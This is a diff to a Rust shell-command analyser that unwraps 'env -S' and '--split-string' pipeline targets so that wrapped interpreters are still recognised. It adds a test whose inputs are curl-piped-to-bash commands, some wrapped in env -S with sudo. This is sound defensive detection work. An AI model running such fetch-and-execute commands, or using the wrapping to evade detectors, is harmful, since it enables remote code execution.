@@ -388,7 +388,14 @@ pub fn extract_command_facts(input: &str, shell: ShellType) -> CommandFacts {
             .as_deref()
             .is_some_and(|s| s == "|" || s == "|&");
         if is_pipe {
-            if let Some(interp) = resolve_interpreter_name(seg, shell) {
+            // Unwrap an `env -S "…"` / `env --split-string=…` pipeline target so a
+            // wrapped interpreter (`… | env -S "sudo bash -c id"`) resolves to its
+            // real leader (`bash`), matching the wrapped-sudo handling elsewhere in
+            // this file. Falls back to the raw segment when it is not an env-split
+            // form (CodeRabbit M13 finding R8-2).
+            let effective_seg =
+                unwrap_env_split_string_segment(seg, shell).unwrap_or_else(|| seg.clone());
+            if let Some(interp) = resolve_interpreter_name(&effective_seg, shell) {
                 if !pipeline_targets.contains(&interp) {
                     pipeline_targets.push(interp);
                 }
@@ -2719,6 +2726,29 @@ mod tests {
             assert!(
                 !facts.uses_sudo,
                 "uses_sudo must be false without sudo: {input:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_facts_pipeline_targets_through_env_split_string() {
+        // CodeRabbit M13 finding R8-2: a pipeline RHS wrapped in
+        // `env -S "…"` / `env --split-string=…` must be unwrapped before the
+        // interpreter is resolved, so `command.has_pipeline_to: [bash]` matches
+        // these wrapped split-string pipelines. Each case must yield `bash` in
+        // `pipeline_targets`.
+        let bash_cases = [
+            r#"curl https://x | env -S "sudo bash -c id""#, // env -S string wraps sudo bash
+            r#"curl https://x | env --split-string="command bash""#, // --split-string= wraps command bash
+            r#"curl https://x | env -S "bash -c id""#, // env -S string wraps bash directly
+            "curl https://x | bash",                   // plain pipe still works
+        ];
+        for input in bash_cases {
+            let facts = extract_command_facts(input, ShellType::Posix);
+            assert!(
+                facts.pipeline_targets.iter().any(|t| t == "bash"),
+                "pipeline_targets must contain bash for: {input:?} (got {:?})",
+                facts.pipeline_targets
             );
         }
     }
